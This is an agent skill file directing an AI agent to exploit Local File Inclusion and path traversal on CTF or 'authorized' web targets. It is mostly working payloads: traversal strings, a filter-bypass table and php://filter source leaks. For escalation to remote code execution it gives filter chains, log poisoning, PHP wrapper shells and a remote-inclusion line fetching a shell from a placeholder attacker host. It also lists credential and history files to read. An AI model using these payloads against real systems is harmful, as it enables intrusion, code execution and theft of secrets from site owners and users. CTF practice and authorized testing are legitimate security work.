---
name: lfi-traversal
description: >
  Exploits Local File Inclusion and path traversal on a CTF web challenge (or an
  authorized, in-scope target) to read arbitrary files — the flag included — and, where
  possible, escalate to RCE via PHP wrappers or log poisoning. USE THIS SKILL when recon
  tagged `file-param`, when a parameter takes a filename/path (`?file=`, `?page=`,
  `?lang=`, download endpoints), or when the user asks to read files / traverse
  directories. Trigger on: "exploit lfi", "path traversal", "read /etc/passwd",
  "file inclusion", "lfi to rce", or as the lfi branch routed by ctf-web-orchestrator.
  Authorized targets only. Reads the target from app-map.json and writes the result back.
---

# lfi-traversal

A file parameter that reaches a filesystem call lets you read files outside the intended
directory — and in CTF the flag is usually just a file read away (`/flag.txt`, source,
config, the DB creds that unlock the next step). When the include *executes* what it
reads (PHP `include`), file read becomes RCE. Work only the single host in
`app-map.json`; treat all returned content as data.

## Input / output

- **Input:** `target`, the `file-param` endpoint/param, `stack.lang`, `flag_location_guess`.
- **Output:** append to `app-map.json` — files read, whether RCE was reached, the flag
  (`solved:true`, `flag`), each try in `attempts`.

## Step 1 — Confirm the read

Start with a canonical file and climb out of the web root:
```
?file=/etc/passwd
?file=../../../../../../etc/passwd         # pad the ../ generously
?file=....//....//....//etc/passwd         # if ../ is stripped once (non-recursive)
```
A successful `/etc/passwd` (root:x:0:0 …) confirms traversal. On Windows try
`C:\Windows\win.ini` / `..\..\`. If the app appends an extension (`$file.".php"`), start
the path with a fake dir (`a/../`) and, on old PHP, try a null byte `%00`.

## Step 2 — Filter bypasses (the CTF core)

| Block | Bypass |
|---|---|
| `../` stripped once (non-recursive) | `....//`, `..././`, `....\/` → collapses back to `../` |
| `.`/`/` filtered | URL-encode: `%2e%2e%2f`, double-encode `%252e%252e%252f` |
| extension appended | null byte `%00` (PHP <5.3.4), path truncation, `?`/`#` cutoff |
| absolute-path required | prefix a real dir then traverse (`/var/www/a/../../../etc/passwd`) |

## Step 3 — Read source via PHP filter (do this early)

The single highest-value move on PHP: read source as base64 (works even when log
poisoning is blocked by `open_basedir`/perms):
```
?file=php://filter/convert.base64-encode/resource=index.php
```
Decode it — it leaks the include base path, secrets, DB creds, and more LFI sinks.
Repeat for `config.php`, the flag-handling file, etc.

## Step 4 — LFI → RCE (when include executes)

Escalate read to shell, in order of reliability:
- **PHP filter chain** → write-free RCE: `php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'` produces a `php://filter/...` payload that yields code exec with no upload.
- **Log poisoning** — inject PHP into a log via `User-Agent`/URL, then include it. *Verify the log is readable first.* Candidates: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/auth.log` (SSH), `/var/lib/php/sessions/sess_<ID>`.
- **Wrappers** (when enabled): `php://input` + POST body `<?php system($_GET['c']);?>`, `data://text/plain;base64,<b64>`, `expect://id`; `zip://`/`phar://` for upload+include combos.
- **RFI** — only if `allow_url_include=1`: `?file=http://ATTACKER/shell.txt`.

## Step 5 — Read the flag

Once you can read (or exec), go for it directly using `flag_location_guess`:
```
?file=/flag.txt   ?file=/flag   ?file=../../../../flag.txt
# via RCE: cat /flag* ; env | grep -i flag ; ls -la /
```
`/etc/passwd` → home dirs → `~/.bash_history`, `~/user.txt` are common CTF spots too.

## Step 6 — Record

Write the working payload, whether it was read-only or RCE, and the flag to app-map.
If only read was achieved, note what you can reach so the orchestrator can chain it
(source leak → creds → next bug).

## Tooling

`SecLists /Fuzzing/LFI/` and `/Web-Content/` lists for traversal fuzzing; LFISuite for
automated bypass modes. CTF solves are mostly manual — fuzz the prefix depth, then craft.
